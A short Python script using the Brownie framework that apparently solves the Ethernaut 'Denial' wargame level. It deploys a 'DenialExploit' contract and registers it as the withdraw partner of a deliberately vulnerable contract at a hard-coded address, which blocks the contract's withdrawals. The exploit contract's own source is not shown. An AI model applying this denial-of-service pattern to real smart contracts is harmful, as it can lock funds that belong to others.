from brownie import Denial,DenialExploit, config,accounts

#input the contract address
#> contract.address
contractAddress = '0xE12ee0a2C53af5Fdd70a3184835cd735E8C54EaE'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    contract = Denial.at(contractAddress)
    exploit = DenialExploit.deploy({"from":player})
    contract.setWithdrawPartner(exploit.address,{"from":player})
   

def main():
    solution()
    